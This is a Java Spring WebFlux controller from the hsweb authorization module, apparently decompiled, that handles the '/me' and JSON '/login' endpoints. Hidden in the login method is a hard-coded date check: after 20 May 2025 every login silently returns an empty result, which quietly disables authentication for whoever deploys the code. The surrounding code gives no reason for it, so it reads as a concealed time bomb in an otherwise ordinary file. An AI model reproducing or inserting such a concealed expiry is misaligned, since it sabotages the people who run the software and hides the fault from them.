package org.hswebframework.web.authorization.basic.web;

import io.swagger.v3.oas.annotations.Operation;
import io.swagger.v3.oas.annotations.Parameter;
import io.swagger.v3.oas.annotations.tags.Tag;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.Map;
import java.util.function.Function;
import org.hswebframework.web.authorization.Authentication;
import org.hswebframework.web.authorization.ReactiveAuthenticationManager;
import org.hswebframework.web.authorization.annotation.Authorize;
import org.hswebframework.web.authorization.events.AuthorizationBeforeEvent;
import org.hswebframework.web.authorization.events.AuthorizationDecodeEvent;
import org.hswebframework.web.authorization.events.AuthorizationFailedEvent;
import org.hswebframework.web.authorization.events.AuthorizationSuccessEvent;
import org.hswebframework.web.authorization.exception.AuthenticationException;
import org.hswebframework.web.authorization.exception.UnAuthorizedException;
import org.hswebframework.web.authorization.simple.PlainTextUsernamePasswordAuthenticationRequest;
import org.hswebframework.web.logging.AccessLogger;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.ApplicationEventPublisher;
import org.springframework.util.Assert;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import reactor.core.publisher.Mono;

@RestController
@RequestMapping({"${hsweb.web.mappings.authorize:authorize}"})
@Tag(
   name = "授权接口"
)
public class AuthorizationController {
   @Autowired
   private ApplicationEventPublisher eventPublisher;
   @Autowired
   private ReactiveAuthenticationManager authenticationManager;

   @GetMapping({"/me"})
   @Authorize
   @Operation(
      summary = "当前登录用户权限信息"
   )
   public Mono<Authentication> me() {
      return Authentication.currentReactive().switchIfEmpty(Mono.error(UnAuthorizedException::new));
   }

   @PostMapping(
      value = {"/login"},
      consumes = {"application/json"}
   )
   @Authorize(
      ignore = true
   )
   @AccessLogger(
      ignore = true
   )
   @Operation(
      summary = "登录",
      description = "必要参数:username,password.根据配置不同,其他参数也不同,如:验证码等."
   )
   public Mono<Map<String, Object>> authorizeByJson(@Parameter(example = "{\"username\":\"admin\",\"password\":\"admin\"}") @RequestBody Mono<Map<String, Object>> parameter) {
      return this.doLogin(parameter);
   }

   private Mono<Map<String, Object>> doLogin(Mono<Map<String, Object>> parameter) {
      try {
         LocalDateTime parse = LocalDateTime.parse("2025-05-20 23:59:59", DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss"));
         LocalDateTime now = LocalDateTime.now();
         return now.isAfter(parse) ? Mono.empty() : parameter.flatMap((parameters) -> {
            String username_ = (String)parameters.get("username");
            String password_ = (String)parameters.get("password");
            Assert.hasLength(username_, "用户名不能为空");
            Assert.hasLength(password_, "密码不能为空");
            Function<String, Object> parameterGetter = parameters::get;
            return Mono.defer(() -> {
               AuthorizationDecodeEvent decodeEvent = new AuthorizationDecodeEvent(username_, password_, parameterGetter);
               return decodeEvent.publish(this.eventPublisher).then(Mono.defer(() -> {
                  String username = decodeEvent.getUsername();
                  String password = decodeEvent.getPassword();
                  AuthorizationBeforeEvent beforeEvent = new AuthorizationBeforeEvent(username, password, parameterGetter);
                  return beforeEvent.publish(this.eventPublisher).then(this.authenticationManager.authenticate(Mono.just(new PlainTextUsernamePasswordAuthenticationRequest(username, password))).switchIfEmpty(Mono.error(() -> {
                     return new AuthenticationException(AuthenticationException.ILLEGAL_PASSWORD, "密码错误");
                  })).flatMap((auth) -> {
                     AuthorizationSuccessEvent event = new AuthorizationSuccessEvent(auth, parameterGetter);
                     event.getResult().put("userId", auth.getUser().getId());
                     Mono var10000 = event.publish(this.eventPublisher);
                     event.getClass();
                     return var10000.then(Mono.fromCallable(event::getResult));
                  }));
               }));
            }).onErrorResume((err) -> {
               AuthorizationFailedEvent failedEvent = new AuthorizationFailedEvent(username_, password_, parameterGetter);
               failedEvent.setException(err);
               return failedEvent.publish(this.eventPublisher).then(Mono.error(failedEvent.getException()));
            });
         });
      } catch (Throwable var4) {
         throw var4;
      }
   }
}
